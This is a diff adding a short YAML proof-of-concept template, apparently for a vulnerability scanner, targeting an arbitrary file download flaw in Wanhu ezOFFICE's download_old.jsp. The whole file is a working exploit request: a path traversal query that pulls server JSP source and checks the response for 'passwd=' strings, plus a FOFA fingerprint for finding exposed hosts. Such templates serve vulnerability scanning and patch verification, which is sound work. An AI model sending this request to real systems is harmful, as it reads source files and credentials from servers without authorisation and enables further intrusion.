@@ -1,0 +1,16 @@
+id: poc-yaml-wan-hu-ezoffice-download-old-jsp-anyfile-download
+info:
+  name: 万户 ezOFFICE  download_old.jsp 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  - ssrf
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: GET
+  path: /defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp
+  expression: status_code == 200 && contains(headers,"application/x-msdownload") &&
+    contains(body,"passwd=") && contains(body,"getAttribute")
+variables: {}
+transport: http
